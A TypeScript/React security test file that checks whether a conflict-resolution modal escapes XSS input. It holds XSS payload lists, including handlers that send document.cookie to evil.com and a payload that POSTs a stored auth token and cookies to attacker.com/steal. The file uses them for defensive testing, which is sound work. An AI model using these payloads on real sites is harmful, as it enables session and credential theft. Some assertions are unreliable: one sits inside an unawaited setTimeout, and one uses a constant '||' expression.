/**
 * XSS (Cross-Site Scripting) Security Test
 * Tests CRITICAL-004: XSS in ConflictResolutionModal
 *
 * Run: npm test -- xss-attack.test.tsx
 */

import { describe, it, expect, vi } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import { ConflictResolutionModal } from '../../components/ConflictResolutionModal';
import type { SyncConflict } from '../../mockData/syncMockData';

describe('XSS Attack Tests - ConflictResolutionModal', () => {
  const mockOnClose = vi.fn();
  const mockOnResolve = vi.fn();

  it('[CRITICAL-004] Should escape HTML in conflict localValue', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<svg onload="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<marquee onstart="alert(\'XSS\')">',
      '<style>@import\'http://evil.com/steal.css\';</style>'
    ];

    for (const payload of xssPayloads) {
      const conflicts: SyncConflict[] = [
        {
          id: 'conflict-1',
          fieldName: 'description',
          localValue: payload,  // 🔴 Malicious XSS payload
          remoteValue: 'Safe description',
          localVersion: 2,
          remoteVersion: 3,
          lastModifiedBy: {
            id: 'user-1',
            username: 'attacker',
            email: 'attacker@evil.com'
          },
          lastModifiedAt: new Date()
        }
      ];

      const { container } = render(
        <ConflictResolutionModal
          isOpen={true}
          onClose={mockOnClose}
          conflicts={conflicts}
          pfaId="PFA-12345"
          jobId="job-1"
          onResolve={mockOnResolve}
        />
      );

      // Check if script tag is present in DOM (should NOT be)
      const scriptTags = container.querySelectorAll('script');
      expect(scriptTags.length).toBe(0);

      // Check if dangerous HTML is rendered (should be escaped)
      const dangerousElements = container.querySelectorAll('img, iframe, svg, body, input, marquee, style');
      const userContentElements = Array.from(dangerousElements).filter(el =>
        el.textContent?.includes(payload) || el.innerHTML?.includes(payload)
      );

      expect(userContentElements.length).toBe(0);

      console.log(`✅ XSS payload escaped: ${payload.substring(0, 30)}...`);
    }
  });

  it('[CRITICAL-004] Should escape JavaScript event handlers', () => {
    const eventHandlerPayloads = [
      'onerror="alert(1)"',
      'onload="fetch(\'https://evil.com?steal=\'+document.cookie)"',
      'onclick="window.location=\'https://evil.com\'"',
      'onfocus="eval(atob(\'YWxlcnQoMSk=\'))"'  // Base64 encoded alert(1)
    ];

    for (const payload of eventHandlerPayloads) {
      const conflicts: SyncConflict[] = [
        {
          id: 'conflict-1',
          fieldName: 'manufacturer',
          localValue: `<img src=x ${payload}>`,
          remoteValue: 'Caterpillar',
          localVersion: 1,
          remoteVersion: 2,
          lastModifiedBy: {
            id: 'user-1',
            username: 'attacker',
            email: 'attacker@evil.com'
          },
          lastModifiedAt: new Date()
        }
      ];

      const { container } = render(
        <ConflictResolutionModal
          isOpen={true}
          onClose={mockOnClose}
          conflicts={conflicts}
          pfaId="PFA-12345"
          jobId="job-1"
          onResolve={mockOnResolve}
        />
      );

      // Search for event handler attributes in rendered HTML
      const html = container.innerHTML;
      const hasEventHandler = html.includes('onerror=') ||
                              html.includes('onload=') ||
                              html.includes('onclick=') ||
                              html.includes('onfocus=');

      expect(hasEventHandler).toBe(false);

      console.log(`✅ Event handler escaped: ${payload.substring(0, 30)}...`);
    }
  });

  it('[CRITICAL-004] Should prevent data exfiltration via XSS', () => {
    // Simulate attacker trying to steal JWT token
    const stealTokenPayload = `
      <img src=x onerror="
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify({
            token: localStorage.getItem('pfa_auth_token'),
            user: document.cookie
          })
        })
      ">
    `;

    const conflicts: SyncConflict[] = [
      {
        id: 'conflict-1',
        fieldName: 'equipment',
        localValue: stealTokenPayload,
        remoteValue: 'CAT-320D',
        localVersion: 1,
        remoteVersion: 2,
        lastModifiedBy: {
          id: 'user-1',
          username: 'attacker',
          email: 'attacker@evil.com'
        },
        lastModifiedAt: new Date()
      }
    ];

    // Mock fetch to detect if it's called
    const fetchSpy = vi.spyOn(global, 'fetch').mockResolvedValue(new Response());

    render(
      <ConflictResolutionModal
        isOpen={true}
        onClose={mockOnClose}
        conflicts={conflicts}
        pfaId="PFA-12345"
        jobId="job-1"
        onResolve={mockOnResolve}
      />
    );

    // Wait a bit to see if fetch is called
    setTimeout(() => {
      // Fetch should NOT be called to attacker.com
      const attackerCalls = fetchSpy.mock.calls.filter(call =>
        call[0]?.toString().includes('attacker.com')
      );

      expect(attackerCalls.length).toBe(0);

      console.log('✅ Data exfiltration attempt blocked');

      fetchSpy.mockRestore();
    }, 100);
  });

  it('[CRITICAL-004] Should sanitize numeric values rendered as currency', () => {
    // Try to inject XSS via number formatting
    const conflicts: SyncConflict[] = [
      {
        id: 'conflict-1',
        fieldName: 'monthlyRate',
        localValue: 5000,  // Legitimate number
        remoteValue: NaN,  // Could cause formatting issues
        localVersion: 1,
        remoteVersion: 2,
        lastModifiedBy: {
          id: 'user-1',
          username: 'user',
          email: 'user@test.com'
        },
        lastModifiedAt: new Date()
      }
    ];

    const { container } = render(
      <ConflictResolutionModal
        isOpen={true}
        onClose={mockOnClose}
        conflicts={conflicts}
        pfaId="PFA-12345"
        jobId="job-1"
        onResolve={mockOnResolve}
      />
    );

    // Should render safely (no crash, no XSS)
    expect(container).toBeTruthy();

    console.log('✅ Number formatting XSS prevented');
  });

  it('[CRITICAL-004] Should escape date values', () => {
    // Try to inject via date object
    const conflicts: SyncConflict[] = [
      {
        id: 'conflict-1',
        fieldName: 'forecastStart',
        localValue: new Date('2025-01-01<script>alert(1)</script>'),  // Invalid date
        remoteValue: new Date('2025-01-01'),
        localVersion: 1,
        remoteVersion: 2,
        lastModifiedBy: {
          id: 'user-1',
          username: 'user',
          email: 'user@test.com'
        },
        lastModifiedAt: new Date()
      }
    ];

    const { container } = render(
      <ConflictResolutionModal
        isOpen={true}
        onClose={mockOnClose}
        conflicts={conflicts}
        pfaId="PFA-12345"
        jobId="job-1"
        onResolve={mockOnResolve}
      />
    );

    // Should not render script tag
    const scriptTags = container.querySelectorAll('script');
    expect(scriptTags.length).toBe(0);

    console.log('✅ Date XSS prevented');
  });

  it('[CRITICAL-004] Should use DOMPurify or React auto-escaping', () => {
    // Test that React's built-in escaping works
    const conflicts: SyncConflict[] = [
      {
        id: 'conflict-1',
        fieldName: 'description',
        localValue: '<b>Bold</b> & <i>Italic</i>',  // HTML formatting
        remoteValue: 'Plain text',
        localVersion: 1,
        remoteVersion: 2,
        lastModifiedBy: {
          id: 'user-1',
          username: 'user',
          email: 'user@test.com'
        },
        lastModifiedAt: new Date()
      }
    ];

    const { container } = render(
      <ConflictResolutionModal
        isOpen={true}
        onClose={mockOnClose}
        conflicts={conflicts}
        pfaId="PFA-12345"
        jobId="job-1"
        onResolve={mockOnResolve}
      />
    );

    // HTML should be escaped, not rendered
    const boldTags = container.querySelectorAll('b');
    const italicTags = container.querySelectorAll('i');

    // Bold/italic tags should NOT be rendered (escaped as text)
    const userBoldTags = Array.from(boldTags).filter(el =>
      el.textContent?.includes('Bold')
    );
    const userItalicTags = Array.from(italicTags).filter(el =>
      el.textContent?.includes('Italic')
    );

    expect(userBoldTags.length).toBe(0);
    expect(userItalicTags.length).toBe(0);

    // Should see escaped HTML in text content
    const textContent = container.textContent || '';
    expect(textContent).toContain('&lt;b&gt;' || '<b>');  // Escaped

    console.log('✅ HTML tags escaped correctly');
  });

  it('[PASS] Should allow safe text content', () => {
    const safeConflicts: SyncConflict[] = [
      {
        id: 'conflict-1',
        fieldName: 'description',
        localValue: 'Caterpillar 320D Excavator',
        remoteValue: 'Komatsu PC200 Excavator',
        localVersion: 1,
        remoteVersion: 2,
        lastModifiedBy: {
          id: 'user-1',
          username: 'john.doe',
          email: 'john@example.com'
        },
        lastModifiedAt: new Date()
      }
    ];

    const { getByText } = render(
      <ConflictResolutionModal
        isOpen={true}
        onClose={mockOnClose}
        conflicts={safeConflicts}
        pfaId="PFA-12345"
        jobId="job-1"
        onResolve={mockOnResolve}
      />
    );

    // Should render safe content normally
    expect(getByText('Caterpillar 320D Excavator')).toBeTruthy();
    expect(getByText('Komatsu PC200 Excavator')).toBeTruthy();

    console.log('✅ Safe content rendered correctly');
  });
});
